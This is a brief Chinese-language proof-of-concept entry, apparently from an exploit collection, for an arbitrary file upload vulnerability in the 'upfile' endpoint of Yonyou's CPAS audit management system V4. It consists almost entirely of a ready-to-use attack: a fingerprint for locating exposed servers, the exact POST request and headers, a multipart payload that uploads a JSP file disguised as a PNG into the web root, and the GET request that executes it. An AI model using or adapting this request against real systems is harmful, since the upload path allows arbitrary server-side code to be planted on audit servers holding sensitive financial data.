# 用友友数聚科技CPAS审计管理系统V4upfile存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/cpasm4/static/cap/font/iconfont.css"`
- **请求**：`POST /cpasm4/iWebPdf/upfile?filePath=/usr/cpasm/webapps/cpasm4/views/ HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=----geckoformboundary344fd82a9…`　`Content-Length: 352`

**请求体 / payload**
```
------geckoformboundary344fd82a960cbe4f3f0146b1f4ee3833
Content-Disposition: form-data; name="file"; filename="test1.jsp"
Content-Type: image/png
<% out.print("hello");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------geckoformboundary344fd82a960cbe4f3f0146b1f4ee3833--
GET /cpasm4/views/test1.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—